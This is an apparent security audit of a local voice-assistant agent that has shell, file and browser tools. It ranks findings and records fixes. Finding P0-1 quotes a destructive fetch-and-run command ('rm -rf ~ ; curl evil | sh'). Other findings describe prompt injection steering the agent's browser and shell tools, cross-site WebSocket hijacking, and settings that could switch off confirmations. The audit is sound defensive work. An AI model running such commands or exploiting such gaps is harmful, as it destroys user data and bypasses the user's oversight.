# JARVIS-AI — Security & Architecture Audit

_Audit date: 2026-07-11. Scope: full repository (~1,800 lines Python + React HUD).
Verified against source, not documentation._

## What this project actually is

A **local, voice-first assistant for Apple Silicon Macs**, fully offline:

- **Wake word** → openWakeWord ("hey jarvis"), always listening (`src/audio/wake_word.py`)
- **Record** → sounddevice + WebRTC VAD end-of-turn (`src/audio/recorder.py`)
- **STT** → MLX Whisper large-v3-turbo, on-device (`src/audio/stt.py`)
- **Brain** → local MLX LLM (Llama-3.1-8B / Qwen2.5-14B), a hand-rolled JSON
  tool-calling ReAct loop (`src/brain/agent.py`)
- **Tools** → memory, read_file, write_file, run_shell, web_search, Playwright-MCP
  browser control (`src/brain/tools.py`, `browser_tools.py`)
- **TTS** → mlx-audio Kokoro, sentence-streamed (`src/audio/tts.py`)
- **UI** → pywebview React window + rumps menu bar, driven over a localhost
  WebSocket (`src/hud/`, `src/system/menubar.py`)
- **Runs as** 3 launchd LaunchAgents (HUD / voice / menu bar), split across
  processes because AppKit + pywebview + the mic each need their own Cocoa main thread.

It is a **well-documented MVP**, not a production product. It works as a demo but
has several serious security holes relative to its own stated safety goals.

## Process architecture

```
 [launchd] ── com.krishna.jarvis          → src.main      (pywebview HUD + WebSocket server :8765)
          ── com.krishna.jarvis.voice     → src.pipeline  (mic → wake → STT → brain → TTS)
          ── com.krishna.jarvis.menubar   → src.system.menubar (rumps status)
                       │
        all state + privileged RPC multiplexed over ws://127.0.0.1:8765
```

## Findings (ranked)

### P0 — security / release blockers

| # | Finding | File | Status |
|---|---------|------|--------|
| P0-1 | **Arbitrary shell execution.** `run_shell` ran the model's raw string with `shell=True`, inheriting the full env (incl. `.env` secrets). A hallucinated or injected `rm -rf ~ ; curl evil \| sh` would execute. Confirmation existed but a single spoken "confirm" (or a 3B model's *hallucinated* confirmation) was enough. | `brain/tools.py` | **FIXED** — allowlisted executables, `shell=False`, metachar rejection, scrubbed env. |
| P0-2 | **Browser tools had zero approval gating.** Every Playwright-MCP tool (navigate, click, type, submit, upload) was registered with `confirm_key=None` — the LLM could submit forms / click "buy" / authenticate driven by untrusted page text, no confirmation. | `brain/browser_tools.py` | **FIXED** — read-only vs. mutating classification; mutating actions gated on `browser_action`. |
| P0-3 | **Cross-site WebSocket hijacking (CSWSH).** The HUD socket on `127.0.0.1:8765` had no Origin check and no auth. WebSocket connections are exempt from CORS, so **any website the user visits** could `new WebSocket("ws://127.0.0.1:8765")` and issue privileged RPC — read the entire transcript & memory, delete memory files, rewrite `config.yaml`. | `hud/server.py` | **FIXED** — Origin allowlist (native/`null`/`file://` only), 256 KB message cap. Verified live: `https://evil.example` rejected. |
| P0-4 | **Settings could disable the safety model.** `save_config` let the UI (or a CSWSH attacker via P0-3) set `filesystem_allowlist: ["/"]` and empty `require_confirmation_for`, defeating filesystem scoping and all confirmations at once. | `hud/api.py`, `system/config.py` | **FIXED** — allowlist validation (no `/`, no `~`, no `.ssh`/`.aws`/Keychains); mandatory confirmations re-added on every write. |
| P0-5 | **Personal data committed to the repo.** `.gitignore` explicitly force-committed `memories/preferences.md` (real name, student status) and `seed_default_memories()` hardcoded it. | `.gitignore`, `brain/memory.py` | **FIXED** — untracked, seed de-personalized. |

### P1 — major reliability / product gaps

- **Unbounded context.** `session.messages` grew forever. **FIXED** —
  `core/context.py` token-budgeted pruning (system prompt + recent kept,
  middle summarized/elided), wired into the agent loop.
- **No barge-in / interruption.** The pipeline was strictly serial and deaf
  while speaking. **PARTIALLY FIXED** — `core/state_machine.py` +
  `core/cancellation.py` + interruptible `tts.speak(should_stop=…)` +
  cancel checkpoints in `run_turn` (a barged-in turn never runs a stale tool).
  Remaining: the concurrent mic *watcher* that fires the cancel during
  speaking — needs Mac audio verification.
- **Blocking, non-streaming generation.** Still open — `LocalLLM.chat()`
  returns the whole reply at once. Next: `chat_stream` via
  `mlx_lm.stream_generate` (see IMPLEMENTATION_STATUS.md).
- **No model lifecycle management.** **FIXED** — `local_llm.py` now evicts any
  other model before loading (single-model residency), preventing 8B+14B dual
  residency.
- **Logs/transcripts unredacted & unrotated.** **FIXED** —
  `system/redaction.py` scrubs secrets + `RotatingFileHandler`; applied to the
  log, tool-call log, and transcript.
- **Fragile web search.** Regex-scrapes DuckDuckGo HTML; breaks on markup change,
  no citation model, page text fed to the LLM with no prompt-injection isolation
  (`brain/web_search.py`).
- **Hand-rolled MCP client.** `mcp_client.py` implements a sliver of MCP by hand;
  no cancellation, no progress, no child-process supervision/restart. The official
  `mcp` Python SDK should replace it.
- **`_read_file` path check has a TOCTOU-ish gap.** It validates `str(path)` before
  `.resolve()`, then resolves separately; symlinks inside allowed dirs can point out.
  Low severity given the allowlist, but should resolve-then-check atomically.

### P2 — quality / maintainability

- No lint / type-check / security-scan / CI (`ruff`, `mypy`, `bandit`, `pip-audit`).
- No dependency lock (`uv.lock`); models unpinned by revision (float on HF `latest`).
- 4 of 8 test files (MLX/audio/wake) can't run without Apple-Silicon deps — no
  hardware-independent CI lane.
- `run_config` `voice` field not in the editable allowlist yet is user-facing.
- `update_config_yaml` drops comments (documented) — fine for now.

### P3 — enhancements

- Native SwiftUI app + XPC (replace 3 LaunchAgents tied to a repo clone path).
- Structured SQLite memory with provenance/confidence/retention (replace flat MD).
- Push-to-talk, device-change recovery, sleep/wake recovery, output-device selection.
- Notarized `.app` + DMG so setup needs no terminal.

## Verification performed in this environment

- **Ran hardware-independent tests: 76 passed** (config, HUD relay/API, memory tool,
  tool guard, agent parsing, + new hardening tests) under an isolated Python 3.9 venv.
- **CSWSH fix verified live** against `websockets` 15.0.1: a `https://` Origin is
  rejected at the handshake; a native no-Origin client connects.
- **run_shell hardening verified**: metacharacters and non-allowlisted executables
  are refused; `echo hello` still works.

## NOT VERIFIED IN THIS ENVIRONMENT

Requires an Apple Silicon Mac with MLX + audio deps and Python 3.12 (only 3.9.6 is
installed here):

- Wake word, STT, TTS, the MLX brain, the full voice loop.
- pywebview HUD window, rumps menu bar, launchd behavior.
- Any latency / memory / soak benchmark.
- App signing / notarization (no Developer identity available).

## Live exposure note

At audit time a **running Jarvis HUD server was listening on `127.0.0.1:8765`**
(PID 76249) with all three LaunchAgents loaded — i.e. the *old, unhardened* code
(P0-3 CSWSH) is live. Restart the HUD process after applying this branch to close it.
</content>
